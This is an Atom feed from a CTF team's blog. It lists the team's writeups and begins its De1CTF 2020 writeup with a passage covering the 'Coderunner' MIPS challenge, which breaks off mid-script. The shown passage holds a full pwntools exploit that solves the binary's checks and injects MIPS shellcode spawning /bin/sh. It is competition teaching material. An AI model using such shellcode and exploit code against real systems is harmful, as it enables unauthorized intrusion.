<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>De1ta</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.de1ta.com/"/>
  <updated>2020-05-07T04:28:30.573Z</updated>
  <id>https://blog.de1ta.com/</id>
  
  <author>
    <name>chybeta、pr0ph3t</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Write ups for CTFs</title>
    <link href="https://blog.de1ta.com/2099/05/22/Write-ups-for-CTFs/"/>
    <id>https://blog.de1ta.com/2099/05/22/Write-ups-for-CTFs/</id>
    <published>2099-05-22T01:31:18.000Z</published>
    <updated>2020-05-07T04:28:30.573Z</updated>
    
    <content type="html"><![CDATA[<p>There are lots of teas. <a id="more"></a></p><p><a href="https://blog.de1ta.club/2020/05/06/de1ctf2020%20Writeup/" target="_blank" rel="noopener">De1CTF 2020 Writeup —— De1ta</a></p><p><a href="https://blog.de1ta.club/2020/03/10/XCTF%3CZHANYI%3E-2020/" target="_blank" rel="noopener">XCTF战疫 2020 Writeup —— De1ta</a></p><p><a href="https://blog.de1ta.club/2019/08/19/SUCTF2019/" target="_blank" rel="noopener">SUCTF 2019 Writeup —— De1ta</a></p><p><a href="https://blog.de1ta.club/2019/08/08/de1ctf2019%20Writeup/" target="_blank" rel="noopener">De1CTF 2019 Writeup —— De1ta</a></p><p><a href="https://blog.de1ta.club/2019/06/24/sctf2019/" target="_blank" rel="noopener">SCTF 2019 Writeup —— De1ta</a></p><p><a href="https://blog.de1ta.club/2019/05/21/RCTF-De1ta/" target="_blank" rel="noopener">RCTF 2019 Writeup —— De1ta</a></p><p><a href="https://blog.de1ta.club/2019/04/30/*CTF%202019%20Writeup/" target="_blank" rel="noopener">*CTF 2019 Writeup —— De1ta</a></p><p><a href="https://blog.de1ta.club/2018/11/12/HCTF2018/" target="_blank" rel="noopener">HCTF 2018 Writeup —— De1ta</a></p><p><a href="https://blog.de1ta.club/2018/11/04/XCTF%202018%20FINALS/" target="_blank" rel="noopener">XCTF 2018 FINALS Writeup —— De1ta</a></p><p><a href="https://blog.de1ta.club/2018/06/22/SCTF2018/" target="_blank" rel="noopener">SCTF 2018 Writeup —— De1ta</a></p><p><a href="https://blog.de1ta.club/2018/05/22/RCTF-2018-Writeup/" target="_blank" rel="noopener">RCTF 2018 Writeup —— De1ta</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;There are lots of teas.
    
    </summary>
    
    
      <category term="ctf" scheme="https://blog.de1ta.com/tags/ctf/"/>
    
      <category term="writeup" scheme="https://blog.de1ta.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>XCTF De1CTF 2020 Writeup</title>
    <link href="https://blog.de1ta.com/2020/05/06/de1ctf2020%20Writeup/"/>
    <id>https://blog.de1ta.com/2020/05/06/de1ctf2020 Writeup/</id>
    <published>2020-05-06T15:00:00.000Z</published>
    <updated>2020-05-07T04:26:26.271Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="de1ta-team"><strong>De1ta-Team</strong></span></h1><a id="more"></a><blockquote><p>Team: De1ta</p></blockquote><p>前排广告位：De1ta长期招 逆向/pwn/密码学/硬件/取证/杂项/etc. 选手，急招二进制和密码选手,有意向的大佬请联系<code>ZGUxdGFAcHJvdG9ubWFpbC5jb20=</code></p><h1><span id="source-exp-wp">source + exp + wp</span></h1><p><a href="https://github.com/De1ta-team/De1CTF2020" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2020</a></p><p><a href="https://github.com/De1ta-team/De1CTF2020/wp_en.pdf" target="_blank" rel="noopener">Eng Version</a></p><!-- toc --><ul><li><a href="#pwn">pwn</a><ul><li><a href="#coderunner">Coderunner</a><ul><li><a href="#setup">setup</a></li><li><a href="#solution">Solution</a><ul><li><a href="#manual-analysis">Manual analysis</a></li><li><a href="#angr">Angr</a></li></ul></li></ul></li><li><a href="#broadcasttest">BroadCastTest</a></li><li><a href="#pppd">pppd</a></li><li><a href="#stl_container">stl_container</a></li><li><a href="#mc_realworld">mc_realworld</a></li></ul></li><li><a href="#crypto">crypto</a><ul><li><a href="#nlfsr">NLFSR</a></li><li><a href="#easyrsa">easyRSA</a></li><li><a href="#ecdh">ECDH</a></li><li><a href="#homomorphic">Homomorphic</a></li><li><a href="#mini-purε-plus">Mini Purε Plus</a></li><li><a href="#ov">OV</a></li><li><a href="#mc_noisemap">mc_noisemap</a></li></ul></li><li><a href="#web">web</a><ul><li><a href="#check-in">check in</a></li><li><a href="#animal-crossing">Animal crossing</a><ul><li><a href="#第一关绕过云waf">第一关：绕过云WAF</a><ul><li><a href="#第一层黑名单检测">第一层：黑名单检测</a></li><li><a href="#第二层静态语法分析">第二层：静态语法分析</a></li></ul></li><li><a href="#第二关读取400张图片">第二关：读取400张图片</a><ul><li><a href="#绕过csp引入截图库">绕过CSP引入截图库</a></li><li><a href="#读取图片并执行">读取图片并执行</a></li></ul></li></ul></li><li><a href="#calc">calc</a><ul><li><a href="#1-challenge-info">1. challenge info</a></li><li><a href="#2-design-document">2. design document</a></li><li><a href="#3-exp">3. exp</a></li><li><a href="#4-other-writeups">4. other writeups</a></li></ul></li><li><a href="#mixture">mixture</a></li><li><a href="#easy-php-uaf">Easy PHP UAF</a><ul><li><a href="#解题思路">解题思路</a></li><li><a href="#exp">exp</a></li></ul></li><li><a href="#mc_logclient">mc_logclient</a></li></ul></li><li><a href="#misc">misc</a><ul><li><a href="#mc_easybgm">mc_easybgm</a></li><li><a href="#misc-mc_joinin">misc - mc_joinin</a></li><li><a href="#mc_champion">mc_champion</a></li><li><a href="#life">Life</a><ul><li><a href="#hints">Hints</a></li><li><a href="#flag">Flag</a></li><li><a href="#solution-1">Solution</a></li><li><a href="#note">Note</a></li></ul></li><li><a href="#easy-protocol">Easy Protocol</a><ul><li><a href="#hint">hint</a></li><li><a href="#part1">part1</a></li><li><a href="#part2">part2</a></li><li><a href="#part3">part3</a></li><li><a href="#end">END</a></li></ul></li><li><a href="#hard_pentest">Hard_Pentest</a><ul><li><a href="#end">End</a></li></ul></li><li><a href="#misc_chowder">Misc_Chowder</a></li></ul></li><li><a href="#reverse">reverse</a><ul><li><a href="#parser">parser</a><ul><li><a href="#出题思路">出题思路</a></li><li><a href="#逆向">逆向</a></li><li><a href="#解法">解法</a></li></ul></li><li><a href="#flw">FLW</a><ul><li><a href="#queuevirtualmachine">QueueVirtualMachine</a></li><li><a href="#virtualmachine">VirtualMachine</a></li><li><a href="#算法设计">算法设计</a></li><li><a href="#exppy">exp.py</a></li></ul></li><li><a href="#little-elves">little elves</a></li><li><a href="#mc_ticktock">mc_ticktock</a></li></ul></li></ul><!-- tocstop --><h1><span id="pwn">pwn</span></h1><h2><span id="coderunner">Coderunner</span></h2><p>It is a chllenge about AEG &amp; mips-asm.</p><h3><span id="setup">setup</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ./docker</span><br><span class="line">docker build -t pwn .</span><br><span class="line">docker run -d -p &quot;0.0.0.0:9999:9999&quot; --name=&quot;pwn&quot; pwn</span><br></pre></td></tr></table></figure><h3><span id="solution">Solution</span></h3><p>There are several types of check functions（6types * 16 rounds). I wish you guys would know mips-instruction more by reading mips-asm / analysising / imatating. But this challenge is harder than I expected. The check part wastes too much time and the timelimit is too strict. By the way, The file Time is able to write, and the context(which you can forge) will be updated to Rank. There are two types of exp for this challenge.</p><h4><span id="manual-analysis">Manual analysis</span></h4><p>fast but annoying</p><ol type="1"><li>Get some binary</li><li>specific solution of each type of check function<ol type="1"><li>Get the Bytecode</li><li>Feature recognition</li><li>Parameter extraction</li></ol></li><li>shellcode</li></ol><p>This rough exp sometimes may work &lt;3. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'mips'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analys</span><span class="params">(name=<span class="string">'./1'</span>)</span>:</span></span><br><span class="line">    b=ELF(name)</span><br><span class="line">    entry=b.sym[<span class="string">'main'</span>]+(<span class="number">0xa8</span><span class="number">-0x1c</span>)</span><br><span class="line">    entry=entry<span class="number">-0x400000</span></span><br><span class="line">    tmp=open(<span class="string">"./1"</span>,<span class="string">"r"</span>)</span><br><span class="line">    check=u32(tmp.read()[entry:entry+<span class="number">3</span>]+<span class="string">'\0'</span>)&lt;&lt;<span class="number">2</span></span><br><span class="line">    check=check+(<span class="number">0xbc</span><span class="number">-0x28</span>)<span class="number">-0x400000</span></span><br><span class="line">    tmp.close()</span><br><span class="line">    tmp=open(<span class="string">"./1"</span>,<span class="string">'r'</span>)</span><br><span class="line">    END=(u32(tmp.read()[check:check+<span class="number">3</span>]+<span class="string">'\0'</span>)&lt;&lt;<span class="number">2</span>)<span class="number">-4</span></span><br><span class="line">    tmp.close()</span><br><span class="line">    <span class="comment"># now we get the END of check funcs</span></span><br><span class="line">    START=<span class="number">0x400bb0</span></span><br><span class="line">    f=open(name)</span><br><span class="line">    f.read(<span class="number">0xbb0</span>)</span><br><span class="line">    data=f.read(END-START)[<span class="number">44</span>:]</span><br><span class="line">    f.close()</span><br><span class="line">    tmp=data.split(<span class="string">"\x08\x00\xe0\x03\x00\x00\x00\x00"</span>)</span><br><span class="line">    <span class="keyword">assert</span>(len(tmp)==<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(s==<span class="string">'\x10'</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span><span class="comment">#&lt;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span><span class="comment">#&gt;=</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_1</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># asb(s[0]*s[0]-s[3]*s[3])?asb(s[1]*s[1]-s[2]*s[2])</span></span><br><span class="line">    <span class="comment"># asb(s[1]*s[1]-s[0]*s[0])?asb(s[2]*s[2]-s[3]*s[3])</span></span><br><span class="line">    s=s[<span class="number">24</span>:]</span><br><span class="line">    tmp=ord(s[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    idx_list=[tmp,(tmp+<span class="number">1</span>)%<span class="number">4</span>,(tmp+<span class="number">2</span>)%<span class="number">4</span>,(tmp+<span class="number">3</span>)%<span class="number">4</span>]</span><br><span class="line">    m1=judge(s[<span class="number">0xa8</span>+<span class="number">7</span>])</span><br><span class="line">    m2=judge(s[<span class="number">0x160</span>+<span class="number">7</span>])</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    tmp=[]</span></span><br><span class="line"><span class="string">    for x in range(4):</span></span><br><span class="line"><span class="string">        tmp.append(Int('x&#123;&#125;'.format(x)))</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">    solver = Solver()</span></span><br><span class="line"><span class="string">    for x in range(4):</span></span><br><span class="line"><span class="string">        solver.add(tmp[x]&gt;=0,tmp[x]&lt;256)</span></span><br><span class="line"><span class="string">    if(m1):</span></span><br><span class="line"><span class="string">        solver.add((tmp[0]*tmp[0]-tmp[3]*tmp[3])*(tmp[0]*tmp[0]-tmp[3]*tmp[3])&lt;(tmp[1]*tmp[1]-tmp[2]*tmp[2])*(tmp[1]*tmp[1]-tmp[2]*tmp[2]))</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        solver.add((tmp[0]*tmp[0]-tmp[3]*tmp[3])*(tmp[0]*tmp[0]-tmp[3]*tmp[3])&gt;=(tmp[1]*tmp[1]-tmp[2]*tmp[2])*(tmp[1]*tmp[1]-tmp[2]*tmp[2]))</span></span><br><span class="line"><span class="string">    if(m2):</span></span><br><span class="line"><span class="string">        solver.add((tmp[1]*tmp[1]-tmp[0]*tmp[0])*(tmp[1]*tmp[1]-tmp[0]*tmp[0])&lt;(tmp[2]*tmp[2]-tmp[3]*tmp[3])*(tmp[2]*tmp[2]-tmp[3]*tmp[3]))</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        solver.add((tmp[1]*tmp[1]-tmp[0]*tmp[0])*(tmp[1]*tmp[1]-tmp[0]*tmp[0])&gt;=(tmp[2]*tmp[2]-tmp[3]*tmp[3])*(tmp[2]*tmp[2]-tmp[3]*tmp[3]))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if solver.check() == sat:</span></span><br><span class="line"><span class="string">        res=solver.model()</span></span><br><span class="line"><span class="string">        print res</span></span><br><span class="line"><span class="string">        print m1,m2</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> m1==<span class="number">1</span> <span class="keyword">and</span> m2==<span class="number">1</span>:</span><br><span class="line">        res_list=[<span class="number">79</span>,<span class="number">192</span>,<span class="number">215</span>,<span class="number">18</span>]</span><br><span class="line">    <span class="keyword">elif</span> m1==<span class="number">1</span> <span class="keyword">and</span> m2==<span class="number">0</span>:</span><br><span class="line">        res_list=[<span class="number">93</span>,<span class="number">246</span>,<span class="number">240</span>,<span class="number">81</span>]</span><br><span class="line">    <span class="keyword">elif</span> m1==<span class="number">0</span> <span class="keyword">and</span> m2==<span class="number">1</span>:</span><br><span class="line">        res_list=[<span class="number">0</span>,<span class="number">88</span>,<span class="number">38</span>,<span class="number">80</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res_list=[<span class="number">227</span>,<span class="number">70</span>,<span class="number">35</span>,<span class="number">163</span>]</span><br><span class="line">    tmp=zip(idx_list,res_list)</span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    tmp.sort()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> tmp:</span><br><span class="line">        res+=chr(_[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_2</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># s[0]+s[1] != ?</span></span><br><span class="line">    <span class="comment"># s[1]+s[2] != ?</span></span><br><span class="line">    <span class="comment"># s[2]+s[3] != ?</span></span><br><span class="line">    <span class="comment"># s[3]+s[0] != ?</span></span><br><span class="line">    <span class="keyword">return</span> p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_3</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># s[0]+s[1]+s[2]== ?</span></span><br><span class="line">    <span class="comment"># s[1]+s[2]+s[3]== ?</span></span><br><span class="line">    <span class="comment"># s[2]+s[3]+s[0]== ?</span></span><br><span class="line">    <span class="comment"># s[3]+s[0]+s[1]== ?</span></span><br><span class="line">    s=s[<span class="number">24</span>:<span class="number">24</span>+<span class="number">0xdc</span>]</span><br><span class="line">    s=s.split(<span class="string">"\0"</span>+<span class="string">'\x62\x14'</span>)</span><br><span class="line">    s.pop()</span><br><span class="line">    idx_list=[((x+ord(s[<span class="number">0</span>][<span class="number">0</span>]))<span class="number">-1</span>)%<span class="number">4</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">    res_list=[]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        res_list.append(u16(s[_][<span class="number">-5</span>:<span class="number">-3</span>]))</span><br><span class="line">    sig=sum(res_list)/<span class="number">3</span></span><br><span class="line">    tmp_list=[]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        tmp_list.append(sig-res_list[_])</span><br><span class="line">    tmp=zip(idx_list,tmp_list)</span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    tmp.sort()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        res+=chr(tmp[_][<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_4</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># s[0] == ?</span></span><br><span class="line">    <span class="comment"># s[1] == ?</span></span><br><span class="line">    <span class="comment"># s[2] == s[0] * s[0]</span></span><br><span class="line">    <span class="comment"># s[3] == s[1]*s[1]+s[2]*s[2]-s[0]*s[0]</span></span><br><span class="line">    s=s[<span class="number">24</span>:]</span><br><span class="line">    <span class="keyword">if</span>(ord(s[<span class="number">0</span>])==<span class="number">0</span>):</span><br><span class="line">        idx_list=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        idx_list=[]</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            idx_list.append((ord(s[<span class="number">0</span>])+_)%<span class="number">4</span>)</span><br><span class="line">    res_list=[]</span><br><span class="line">    tmp=s.find(<span class="string">'\x00\x02\x24'</span>)</span><br><span class="line">    res_list.append(ord(s[tmp<span class="number">-1</span>]))</span><br><span class="line">    res_list.append(ord(s[s.find(<span class="string">'\x00\x02\x24'</span>,tmp+<span class="number">1</span>)<span class="number">-1</span>]))</span><br><span class="line">    res_list.append((res_list[<span class="number">0</span>]*res_list[<span class="number">0</span>])%<span class="number">256</span>)</span><br><span class="line">    res_list.append(((res_list[<span class="number">1</span>]*res_list[<span class="number">1</span>])+(res_list[<span class="number">2</span>]*res_list[<span class="number">2</span>])-(res_list[<span class="number">0</span>]*res_list[<span class="number">0</span>]))%<span class="number">256</span>)</span><br><span class="line">    tmp=zip(idx_list,res_list)</span><br><span class="line">    tmp.sort()</span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> tmp:</span><br><span class="line">        res+=chr(_[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_5</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># s[0]^s[1] == ?</span></span><br><span class="line">    <span class="comment"># s[1] == ?</span></span><br><span class="line">    <span class="comment"># s[2] == ((s[0]^s[1]&amp;0x7f)*2)%256</span></span><br><span class="line">    <span class="comment"># s[3] == s[0]^s[1]^s[2]</span></span><br><span class="line">    s=s[<span class="number">24</span>:<span class="number">24</span>+<span class="number">172</span>]</span><br><span class="line">    s=s.split(<span class="string">'\x00\x62\x14'</span>)</span><br><span class="line">    res_list=[]</span><br><span class="line">    tmp=ord(s[<span class="number">1</span>][<span class="number">-5</span>])</span><br><span class="line">    res_list.append(ord(s[<span class="number">0</span>][<span class="number">-5</span>])^tmp)</span><br><span class="line">    res_list.append(tmp)</span><br><span class="line">    res_list.append((((res_list[<span class="number">0</span>]^res_list[<span class="number">1</span>])&amp;<span class="number">0x7f</span>)*<span class="number">2</span>)%<span class="number">256</span>)</span><br><span class="line">    res_list.append(res_list[<span class="number">0</span>]^res_list[<span class="number">1</span>]^res_list[<span class="number">2</span>])</span><br><span class="line">    idx_list=[(x+ord(s[<span class="number">0</span>][<span class="number">0</span>]))%<span class="number">4</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">    tmp=zip(idx_list,res_list)</span><br><span class="line">    tmp.sort()</span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> tmp:</span><br><span class="line">        res+=chr(x[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_6</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># s[0]=s[2]</span></span><br><span class="line">    <span class="comment"># s[3]=s[1]</span></span><br><span class="line">    <span class="comment"># s[3]= ?</span></span><br><span class="line">    <span class="comment"># s[2]= ?</span></span><br><span class="line">    s=s[<span class="number">24</span>:<span class="number">24</span>+<span class="number">0x64</span>]</span><br><span class="line">    s=s.split(<span class="string">'\x00\x62\x14'</span>)</span><br><span class="line">    s.pop()</span><br><span class="line">    tmp=ord(s[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    idx_list=[tmp,(tmp+<span class="number">2</span>)%<span class="number">4</span>,(tmp+<span class="number">3</span>)%<span class="number">4</span>,(tmp+<span class="number">1</span>)%<span class="number">4</span>]</span><br><span class="line">    res_list=[]</span><br><span class="line">    res_list.append(ord(s[<span class="number">3</span>][<span class="number">-5</span>]))</span><br><span class="line">    res_list.append(ord(s[<span class="number">3</span>][<span class="number">-5</span>]))</span><br><span class="line">    res_list.append(ord(s[<span class="number">2</span>][<span class="number">-5</span>]))</span><br><span class="line">    res_list.append(ord(s[<span class="number">2</span>][<span class="number">-5</span>]))</span><br><span class="line">    tmp=zip(idx_list,res_list)</span><br><span class="line">    tmp.sort()</span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> tmp:</span><br><span class="line">        res+=chr(_[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">######################</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(data)</span>:</span></span><br><span class="line">    p.readuntil(<span class="string">"Faster &gt; \n"</span>)</span><br><span class="line">    p.send(data.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    p.readuntil(<span class="string">"Name\n&gt; "</span>)</span><br><span class="line">    p.send(<span class="string">"niernier"</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    p.readuntil(<span class="string">"&gt; \n"</span>)</span><br><span class="line">    sh=<span class="string">'''</span></span><br><span class="line"><span class="string">    li $a0,0x6e69622f</span></span><br><span class="line"><span class="string">    sw $a0,0($sp)</span></span><br><span class="line"><span class="string">    li $a0,0x68732f</span></span><br><span class="line"><span class="string">    sw $a0,4($sp)</span></span><br><span class="line"><span class="string">    move $a0,$sp</span></span><br><span class="line"><span class="string">    li $v0,4011</span></span><br><span class="line"><span class="string">    li $a1,0</span></span><br><span class="line"><span class="string">    li $a2,0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    print(len(asm(sh)))</span><br><span class="line">    p.send(asm(sh))</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_pow</span><span class="params">()</span>:</span></span><br><span class="line">    p.readuntil(<span class="string">'hashlib.sha256(s).hexdigest() == "'</span>)</span><br><span class="line">    res=p.read(<span class="number">64</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">                    <span class="keyword">if</span>(hashlib.sha256(chr(a)+chr(b)+chr(c)).hexdigest()==res):</span><br><span class="line">                        p.sendlineafter(<span class="string">"&gt;\n"</span>,chr(a)+chr(b)+chr(c))</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"???"</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">######################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>):</span><br><span class="line">        ret=subprocess.Popen(<span class="string">"rm 